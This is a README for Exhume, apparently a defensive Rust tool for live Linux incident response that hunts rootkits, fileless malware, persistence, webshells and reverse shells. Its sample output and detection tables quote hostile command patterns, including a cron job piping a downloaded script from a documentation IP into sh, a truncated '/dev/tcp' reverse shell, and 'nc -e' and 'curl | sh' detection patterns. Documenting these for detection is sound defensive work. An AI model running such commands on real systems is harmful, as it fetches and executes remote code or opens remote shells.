<div align="center">

# Exhume

**Live Linux threat hunting for incident responders.**
Digs up fileless implants, injected code, rootkits, stealthy persistence, webshells and backdoor sockets on a running host, mapped to MITRE ATT&CK.

[![CI](https://github.com/Haind03/Exhume/actions/workflows/ci.yml/badge.svg)](https://github.com/Haind03/Exhume/actions/workflows/ci.yml)
![Rust](https://img.shields.io/badge/rust-2021-orange?logo=rust)
![Platform](https://img.shields.io/badge/platform-linux%20x86__64-blue?logo=linux)
![Binary](https://img.shields.io/badge/binary-static%20musl-informational)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

*by HaiND from the Post and Telecommunication Institute of Technology*

</div>

---

Exhume is a single static binary you drop on a suspect Linux machine and run. It reads `/proc`, `/sys`, the
package database and the filesystem **read-only**, cross-checks several views of the same kernel state to catch
what rootkits hide, scores what it finds, and writes a console summary, a JSON report and a self-contained
offline HTML report.

It is the Linux sister project of [Unveil](https://github.com/Haind03/Unveil) (Windows) and shares its design:
platform-independent detection rules with unit tests, one `Finding` / `Severity` / `Category` model, ATT&CK tags
on every finding, and the same report formats.

## Contents

- [Features](#features)
- [Quick start](#quick-start)
- [Usage](#usage)
- [Detection coverage](#detection-coverage)
- [How it works](#how-it-works)
- [Building](#building)
- [Testing status](#testing-status)
- [Limitations](#limitations)
- [YARA rules and licenses](#yara-rules-and-licenses)
- [License](#license)

## Features

- **Fileless and in-memory code**: processes executing from a `memfd` or a deleted file, anonymous executable and
  RWX memory, ELF images in anonymous memory (reflective loaders), libraries mapped from `/tmp`, `/dev/shm` or
  hidden directories.
- **Masquerading**: user processes wearing kernel-thread names (checked against the kernel's `PF_KTHREAD` flag,
  not the name), system daemon names on binaries outside system directories.
- **Reverse and bind shells**: shells and interpreters whose stdin/stdout is a TCP/UDP socket, shells listening on
  ports, web/database servers spawning shells, reverse-shell and obfuscated command lines.
- **Injection**: `LD_PRELOAD` / `LD_AUDIT` in process environments, `/etc/ld.so.preload`, ptrace attachment
  (`TracerPid`). Exhume is statically linked, so a preload rootkit cannot hook Exhume itself.
- **Rootkit cross-views**: `/proc` listing vs a `kill(pid, 0)` sweep of the whole PID space; `/proc/modules` vs
  `/sys/module` vs `/proc/kallsyms`; kernel taint flags; loaded eBPF programs mapped to their owner processes.
- **Persistence**: cron, anacron, at, systemd services/drop-ins/timers/generators (system and user), rc.local,
  init.d, update-motd.d, shell profiles, SSH `authorized_keys`, sudoers, PAM, udev, XDG autostart, modprobe hooks,
  APT hooks, extra UID 0 accounts, SUID/SGID files, all scored for ownership by a package, location, content
  and recent modification.
- **Integrity**: packaged files that fail dpkg md5sums (verified natively) or `rpm -V`.
- **Webshells**: PHP, JSP and CGI heuristics (sink fed by request input, packed `eval`, Behinder/Godzilla
  loaders, known family markers) on web roots discovered from nginx/Apache configs, Tomcat and `public_html`.
- **Network**: socket inventory mapped to processes via socket inodes, raw/AF_PACKET sniffers (BPFDoor-style
  magic-packet backdoors), sockets owned by suspicious binaries, backdoor ports.
- **YARA** (yara-x, pure Rust) on suspicious memory regions, suspicious process images (even deleted ones,
  through `/proc/<pid>/exe`), persistence targets and web scripts, with vetted Elastic and signature-base rules.
- **IR friendly**: one static musl binary, no dependencies, parallel per-process scanning, SHA-256 of suspicious
  executables, exit code 2 on High/Critical for scripting, graceful degradation without root.

## Quick start

```sh
# download the static binary from the Releases page (or build it, see below)
chmod +x exhume-x86_64-linux-musl
sudo ./exhume-x86_64-linux-musl --html exhume.html --json exhume.json
echo $?   # 2 = High/Critical findings, 0 = none, 1 = error
```

Example console output (abridged):

```
[CRITICAL] Process executing from an anonymous memfd (fileless ELF) (process)  x [pid 4121]
           path: /memfd: (deleted)
           - memfd name: ''
           - sha256: 9f2c...
           att&ck: T1620, T1027.011
[CRITICAL] Shell with network socket as stdin/stdout (reverse or bind shell) (process)  bash [pid 4188]
           - socket: tcp 10.0.0.5:51000 -> 203.0.113.7:4444 ESTABLISHED
           att&ck: T1059.004, T1095
[  HIGH  ] Cron job: */5 * * * * (persistence)
           path: /var/spool/cron/crontabs/root
           - runs: curl -s http://203.0.113.7/a.sh | sh
           att&ck: T1053.003, T1105, T1059.004

Summary: 212 processes, 41 sockets (17 listening/bound), 9 findings  (critical 2, high 3, medium 2, low 2, info 0)
```

## Usage

```
exhume [OPTIONS]

  --json [FILE]           JSON report to FILE ("-" or no value = stdout; silences the console report)
  --html FILE             self-contained offline HTML report
  --min-severity LEVEL    info | low | medium | high | critical   (default: low)
  --deep                  wider and slower sweep (see below)
  --no-color              no ANSI colours (also honoured: NO_COLOR)
  --no-yara               skip YARA scanning
  --rules FILE            extra YARA rule file, repeatable
  --no-pid-bruteforce     skip the kill(pid, 0) sweep of the PID space
  -q, --quiet             no progress messages on stderr

Performance and resource control:
  --threads N             worker threads; 0 = all cores, -N = all cores minus N   (default: half the cores)
  --cpulimit PCT          pause while total system CPU is above PCT, 15-100        (default: 95, 100 = never)
  --minmem MiB            skip heavy items while available memory is below MiB     (default: 100, 0 = off)
  --lowprio               nice 10 and idle I/O class for every Exhume thread
  --soft                  1 thread, low priority, cpulimit 70, no --deep, no PID sweep
  --nosoft                never switch soft mode on automatically
  --max-file-size MiB     largest file read for hashing/YARA          (default: 64, 256 with --deep)
  --max-region-size MiB   largest memory region read for YARA         (default: 64, 256 with --deep)
  --yara-timeout SECS     abort a single YARA scan after SECS         (default: 20)
  --lookback DAYS         filesystem modules only report files changed in the last DAYS
  --max-runtime MINUTES   stop optional work after MINUTES (0 = no limit), report what was covered
```

| | Standard | `--deep` |
| --- | --- | --- |
| Memory peeked for ELF headers | anonymous **executable** regions, memfd | all anonymous regions |
| YARA on memory | regions that earned a finding or hold an ELF header | every anonymous/memfd region of non-JIT processes |
| YARA on process images | suspicious processes | every process |
| SUID/SGID sweep | system, temp, home, web and service directories | whole filesystem (pseudo and network filesystems skipped) |
| Package integrity | binaries in `bin`/`sbin`, PAM modules, core libraries (libc, ld.so, libpam, libkeyutils, libssl, liblzma, ...) | every packaged file |
| Web scripts | up to 50 000 (YARA on 20 000) | no cap |

### Multithreading and resource control

Exhume is built for live response on production hosts, so it scales out without taking the host down:

- **One worker pool, sized on purpose.** All work runs on a dedicated pool of `--threads` workers. The default is
  half the cores, leaving the other half to the host's own workload; `--threads 0` uses every core (forensic
  workstation, isolated host), `--threads -1` all but one.
- **Pipeline instead of a sequence.** Process snapshots and the package database load at the same time. Every
  process is then analysed as its own task (a huge JVM never blocks a batch of small processes). After that, the
  host-wide modules run **concurrently**: PID brute force and kernel module/eBPF cross-views, persistence parsing
  with the SUID/SGID sweep, webshell hunting, and package hashing. Filesystem walks are parallel too: every
  directory fans its subdirectories out as separate tasks.
- **YARA scheduling.** Targets are deduplicated by device and inode (the same binary behind many
  `/proc/<pid>/exe` links is scanned once) and scheduled **largest first**, one target per task, so the scan does not
  end with a single thread chewing a big region while the others sit idle. Each scan has a timeout.
- **Resource governor.** A sampler thread reads `/proc/stat` and `/proc/meminfo` every 500 ms. Before each heavy item
  (memory analysis of a process, a file hash, a web script, a YARA target) a worker checks in: above `--cpulimit` it
  waits (at most 10 s per item, so a permanently busy host is still scanned, slowly); below `--minmem` the item is
  skipped; after `--max-runtime` optional work stops. Skips are counted and listed under *Limitations*.
- **Soft mode** (`--soft`, and automatically on 1-core or < 1 GiB RAM hosts) trades coverage for safety: one
  thread, low priority, `--cpulimit 70`, no `--deep`, no PID sweep.
- **Accountable.** Thread count, pause time, skipped items and the duration of every phase are printed in the console
  summary and stored under `stats` in the JSON report.

Typical command lines:

```sh
sudo exhume --html r.html                            # production server: half the cores, cpulimit 95
sudo exhume --soft --html r.html                     # fragile or tiny host
sudo exhume --threads 0 --deep --cpulimit 100        # isolated host, maximum speed
sudo exhume --lookback 7 --max-runtime 20            # quick triage of recent changes, bounded time
```

**Exit codes**: `0` nothing High or Critical, `2` at least one High/Critical finding (computed before
`--min-severity` filtering), `1` error (for example a report file that cannot be written).

**Running without root** works: Exhume scans what the current user can read and lists every coverage gap under
*Limitations* in all three reports, so a clean result from an unprivileged run is never mistaken for a clean host.

## Detection coverage

| Area | Detection | Default severity | ATT&CK |
| --- | --- | --- | --- |
| Process | Executable is an anonymous memfd | Critical | [T1620](https://attack.mitre.org/techniques/T1620/), [T1027.011](https://attack.mitre.org/techniques/T1027/011/) |
| Process | Executable deleted from disk (Low when replaced by a package upgrade) | High / Critical in temp dirs | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) |
| Process | Executable in `/tmp`, `/var/tmp`, `/dev/shm`, hidden directory | High / Critical | [T1105](https://attack.mitre.org/techniques/T1105/), [T1564.001](https://attack.mitre.org/techniques/T1564/001/) |
| Process | Kernel-thread name without `PF_KTHREAD`, bracketed argv[0] | Critical / High | [T1036.004](https://attack.mitre.org/techniques/T1036/004/), [T1036.005](https://attack.mitre.org/techniques/T1036/005/) |
| Process | System daemon name on a non-system binary | High | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) |
| Process | Shell / interpreter with TCP/UDP socket on stdin/stdout | Critical / High | [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1095](https://attack.mitre.org/techniques/T1095/) |
| Process | Web or database server spawning a shell or recon tool | High | [T1505.003](https://attack.mitre.org/techniques/T1505/003/), [T1190](https://attack.mitre.org/techniques/T1190/) |
| Process | Command line: `/dev/tcp`, `nc -e`, socat exec, inline socket+shell code, base64-to-shell, `curl \| sh`, hex escapes, miner arguments, history suppression, security tools disabled | Medium - Critical | [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1059.006](https://attack.mitre.org/techniques/T1059/006/), [T1027](https://attack.mitre.org/techniques/T1027/), [T1140](https://attack.mitre.org/techniques/T1140/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1496](https://attack.mitre.org/techniques/T1496/), [T1070.003](https://attack.mitre.org/techniques/T1070/003/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| Memory | ELF header in anonymous executable memory | Critical | [T1620](https://attack.mitre.org/techniques/T1620/), [T1055.009](https://attack.mitre.org/techniques/T1055/009/) |
| Memory | Executable memfd mapping | Critical | [T1620](https://attack.mitre.org/techniques/T1620/) |
| Memory | RWX anonymous memory (non-JIT process) | High | [T1055](https://attack.mitre.org/techniques/T1055/) |
| Memory | Anonymous `r-x` memory (non-JIT process) | Medium | [T1055](https://attack.mitre.org/techniques/T1055/) |
| Memory | Executable mapping from temp/hidden path, or of a deleted file | High / Medium | [T1574.006](https://attack.mitre.org/techniques/T1574/006/) |
| Injection | `LD_PRELOAD` / `LD_AUDIT` in a process environment | Low - Critical | [T1574.006](https://attack.mitre.org/techniques/T1574/006/) |
| Injection | `/etc/ld.so.preload` present (Critical when the library is invisible or in temp) | High / Critical | [T1574.006](https://attack.mitre.org/techniques/T1574/006/), [T1014](https://attack.mitre.org/techniques/T1014/) |
| Injection | `TracerPid != 0` by a non-debugger | High | [T1055.008](https://attack.mitre.org/techniques/T1055/008/) |
| Rootkit | PID alive per `kill(pid, 0)` but absent from `/proc` (two passes) | Critical | [T1014](https://attack.mitre.org/techniques/T1014/), [T1564](https://attack.mitre.org/techniques/T1564/) |
| Rootkit | Module in `/proc/kallsyms` but not `/proc/modules` | Critical | [T1014](https://attack.mitre.org/techniques/T1014/), [T1547.006](https://attack.mitre.org/techniques/T1547/006/) |
| Rootkit | Module in `/sys/module` but not `/proc/modules`, or the reverse | High / Medium | [T1014](https://attack.mitre.org/techniques/T1014/) |
| Rootkit | Known LKM rootkit name; uncommon unsigned / out-of-tree module | Critical / Medium | [T1547.006](https://attack.mitre.org/techniques/T1547/006/) |
| Rootkit | Kernel taint flags (forced load/unload, unsigned, out-of-tree) | Info - Medium | [T1547.006](https://attack.mitre.org/techniques/T1547/006/) |
| Rootkit | eBPF kprobe/tracepoint/tracing/LSM program with an unknown owner; packet-filter programs | Medium / Low | [T1014](https://attack.mitre.org/techniques/T1014/), [T1205.002](https://attack.mitre.org/techniques/T1205/002/) |
| Persistence | cron, `/etc/cron.*` scripts, anacron | by content | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) |
| Persistence | at jobs | Info+ | [T1053.002](https://attack.mitre.org/techniques/T1053/002/) |
| Persistence | systemd services, drop-ins, generators (system and user) | by content / ownership | [T1543.002](https://attack.mitre.org/techniques/T1543/002/) |
| Persistence | systemd timers | by ownership | [T1053.006](https://attack.mitre.org/techniques/T1053/006/) |
| Persistence | rc.local, init.d | by content / ownership | [T1037.004](https://attack.mitre.org/techniques/T1037/004/) |
| Persistence | update-motd.d scripts | by content / ownership | [T1037](https://attack.mitre.org/techniques/T1037/) |
| Persistence | Shell profiles: aliases over sudo/su/ssh, network `PROMPT_COMMAND`, exported `LD_PRELOAD` | High | [T1546.004](https://attack.mitre.org/techniques/T1546/004/) |
| Persistence | SSH `authorized_keys` inventory (root keys, recent keys, forced commands) | Info / Low | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) |
| Persistence | sudoers `NOPASSWD: ALL`, shell-capable commands | Low / Medium | [T1548.003](https://attack.mitre.org/techniques/T1548/003/) |
| Persistence | PAM: module outside security dirs, missing module, `pam_exec`, `pam_permit` as sufficient auth, unpackaged module | Medium - Critical | [T1556.003](https://attack.mitre.org/techniques/T1556/003/) |
| Persistence | udev `RUN` / `PROGRAM` / `IMPORT{program}` | by content / ownership | [T1546.017](https://attack.mitre.org/techniques/T1546/017/) |
| Persistence | XDG autostart `.desktop` | by content / ownership | [T1547.013](https://attack.mitre.org/techniques/T1547/013/) |
| Persistence | modprobe `install` hooks running commands | Medium+ | [T1547.006](https://attack.mitre.org/techniques/T1547/006/) |
| Persistence | APT `Pre-Invoke` / `Post-Invoke` hooks | by content / ownership | [T1546](https://attack.mitre.org/techniques/T1546/) |
| Persistence | Additional UID 0 accounts | High | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) |
| Persistence | SUID/SGID: shell-capable copies, world-writable, unpackaged and recent, outside system dirs | Low - Critical | [T1548.001](https://attack.mitre.org/techniques/T1548/001/) |
| Integrity | Packaged file fails dpkg md5sums / `rpm -V` digest | Critical for binaries, PAM, core libs | [T1554](https://attack.mitre.org/techniques/T1554/) |
| Webshell | PHP command/code sink fed by `$_GET`/`$_POST`/..., parameter called as a function | Critical | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) |
| Webshell | Packed `eval(gzinflate(base64_decode(...)))`, `preg_replace /e`, family markers, script in upload dir | Medium / High | [T1505.003](https://attack.mitre.org/techniques/T1505/003/), [T1027](https://attack.mitre.org/techniques/T1027/) |
| Webshell | JSP `Runtime.exec` on request input, `defineClass` on decrypted bytes (Behinder/Godzilla) | Critical | [T1505.003](https://attack.mitre.org/techniques/T1505/003/), [T1620](https://attack.mitre.org/techniques/T1620/) |
| Network | Unexpected AF_PACKET / raw socket owner | High / Critical | [T1205.002](https://attack.mitre.org/techniques/T1205/002/), [T1040](https://attack.mitre.org/techniques/T1040/) |
| Network | Listener or connection owned by a memfd/deleted/temp binary | High / Critical | [T1095](https://attack.mitre.org/techniques/T1095/), [T1571](https://attack.mitre.org/techniques/T1571/) |
| Network | Shell listening on TCP (bind shell); netcat/socat listeners; backdoor ports | Critical / Medium | [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1571](https://attack.mitre.org/techniques/T1571/) |
| YARA | Elastic `Linux_*`, signature-base Linux/ELF and webshell rules, Exhume rules | from rule metadata | per rule |

## How it works

```
src/core   pure detection logic on plain data: process, memory, injection, rootkit, persistence,
           webshell, network and package rules + report model, JSON and HTML output   (unit-tested)
src/linux  read-only collectors: /proc, /sys, bpf(2), dpkg/rpm, filesystem walks, yara-x scanning
rules/     embedded YARA rules (custom, Elastic, signature-base), compiled only when needed
```

- **Read-only.** Process memory is read with `pread` on `/proc/<pid>/mem` (no `ptrace` stop), process existence is
  probed with `kill(pid, 0)` (no signal is delivered), and no file on the host is written except the reports you ask for.
- **Cross-views.** A rootkit has to lie consistently in many places. Exhume asks the kernel the same question in
  different ways (directory listing vs syscall, module list vs sysfs vs symbol table) and reports disagreements.
  Each disagreement is re-checked on a second pass to drop processes and modules that simply appeared or vanished.
- **Static.** The musl build has no dynamic loader, so `/etc/ld.so.preload` and `LD_PRELOAD` rootkits (libprocesshider,
  Azazel, Jynx, ...) cannot hide anything from Exhume itself.
- **Parallel and governed.** A sized worker pool runs per-process analysis, concurrent host-wide modules, parallel
  filesystem walks and largest-first YARA, under a CPU/memory/runtime governor (see
  [Multithreading and resource control](#multithreading-and-resource-control)).
- **Scored, not dumped.** Persistence entries owned by a package, untouched and benign are silent; content, location,
  ownership and modification time decide the severity.

## Building

```sh
# development
cargo build --release

# static binary (what CI ships)
sudo apt-get install musl-tools
rustup target add x86_64-unknown-linux-musl
cargo build --release --target x86_64-unknown-linux-musl
file target/x86_64-unknown-linux-musl/release/exhume   # ... static-pie linked

# without the YARA engine (smaller, faster build)
cargo build --release --no-default-features
```

Requires Rust 1.85+. CI (GitHub Actions) runs `cargo fmt --check`, `cargo clippy -D warnings`, the test suite with
and without the `yara` feature, builds the static musl binary, checks that it is static, runs it unprivileged and
as root, and publishes a GitHub Release (static binary, tarball with licenses, `SHA256SUMS.txt`, notes from
`CHANGELOG.md`) when a `v*` tag is pushed, when `main` gets a `Cargo.toml` version that has no release yet, or
manually via *Actions → CI → Run workflow → release*.

## Testing status

What has actually been tested, so the results can be weighed correctly:

- **Unit tests** cover all pure logic in `src/core` (process, command-line, memory-map, injection, rootkit
  cross-view, taint, eBPF, persistence parsers and scoring, sudoers, PAM, udev, desktop files, authorized_keys,
  package verification parsers, socket table parsing, webshell heuristics, report model and HTML escaping), plus a
  test that compiles **every** embedded YARA file with yara-x and a test that the custom rules match.
- **Live runs** were done in a disposable containerised Linux VM (Ubuntu userland, kernel 6.18, root and the
  unprivileged `nobody` user) with simulated artefacts planted by a script: a binary run from `/dev/shm` and then
  deleted, an ELF executed from a memfd with a `[kworker/0:2]` argv[0], a `bash -i >& /dev/tcp/...` reverse shell to a
  local listener, a shell bound to a listening socket, `LD_PRELOAD` from `/tmp`, a binary named `sshd` in `/tmp`, a
  process named `nginx` spawning `sh`, an AF_PACKET sniffer, RWX memory and an ELF image copied into anonymous memory,
  cron (system and user), a systemd unit, a udev rule, a `.bashrc` alias over `sudo`, a PAM line loading
  `/tmp/pam_x.so`, a second UID 0 account, an added `authorized_keys` entry, a SUID copy of bash in `/var/tmp`, one
  byte appended to a dpkg-owned binary, and PHP/JSP webshells. All of them were reported (Critical or High, the
  authorized key as Low), with exit code 2, and the HTML report was checked in headless Chromium.
- **Not tested live**: `/etc/ld.so.preload` (it would affect every process of the test VM), at jobs, rpm-based
  systems, real LKM or eBPF rootkits and hidden processes. The test VM exposes no `/proc/modules` and does not allow
  loading kernel modules, so the module/kallsyms/eBPF/PID cross-views are covered by unit tests on captured text and
  by clean runs only. False-positive rates on real desktops and busy production servers have not been measured yet.

## Limitations

- **Kernel rootkits can lie to every view.** A rootkit that consistently filters `/proc`, `kill()`, `/sys`,
  `kallsyms` and the bpf syscall will not be seen from userland. Exhume raises the cost of hiding; it cannot replace
  memory forensics (acquire RAM with LiME/AVML and analyse it with Volatility for high-assurance cases).
- **Live response changes nothing but is not invisible**: reading every process's memory and walking the filesystem
  is noisy and can be detected by an attacker watching the host.
- **Containers**: socket tables come from Exhume's own network namespace, so sockets inside other network
  namespaces are not listed (their processes are still scanned). Run Exhume inside the container too if needed.
- **Heuristics** produce false positives (JIT engines, unusual admin setups, packaged software in odd places).
  JIT processes are recognised by name and loaded libraries; treat Medium findings as leads, not verdicts.
- **Package integrity** depends on the package database being trustworthy; an attacker with root can rewrite
  md5sums. Configuration files (conffiles) and missing documentation files are not reported.
- **rpm** verification shells out to `/usr/bin/rpm`; dpkg verification is native.
- **eBPF enumeration** needs `CAP_SYS_ADMIN`/`CAP_BPF`; classic BPF socket filters (`SO_ATTACH_FILTER`) have no
  program ID and are covered only indirectly through the AF_PACKET/raw socket owner check.
- **YARA** scans at most 64 MiB per region/file (256 MiB with `--deep`) and only targets selected as suspicious in
  standard mode.
- **In-memory Java webshells** (filter/servlet injection without a file on disk) are not detected by the webshell module.
- Only x86_64 release binaries are built by CI; the code itself is architecture-independent.

## YARA rules and licenses

Exhume embeds three rule sets; full provenance and the vetting procedure are in [rules/README.md](rules/README.md).

| Source | Upstream commit | Files | License |
| --- | --- | --- | --- |
| Exhume custom rules (`rules/custom`) | - | 1 | MIT |
| [elastic/protections-artifacts](https://github.com/elastic/protections-artifacts) `Linux_*.yar` | `955723319e62a7e4095d256355b095a7594ff48c` | 248 | [Elastic License 2.0](rules/elastic/LICENSE.txt) |
| [Neo23x0/signature-base](https://github.com/Neo23x0/signature-base) Linux/ELF and webshell files | `94a1c48d7ab499879287ff611dfe7f9c56376030` | 51 | [Detection Rule License 1.1](rules/signature-base/LICENSE) |

Vetting: pinned upstream commit, only `.yar` files taken, each file compile-checked on its own with yara-x (in CI),
upstream files unmodified with authors, references and licenses kept. Every YARA finding states the license of the
rule that produced it.

## License

Exhume's source code is released under the [MIT License](LICENSE).
Third-party YARA rules keep their own licenses (see above); the Elastic License 2.0 in particular does not permit
offering those rules to third parties as a hosted or managed service.

---

<div align="center"><sub>Exhume · HaiND from the Post and Telecommunication Institute of Technology</sub></div>
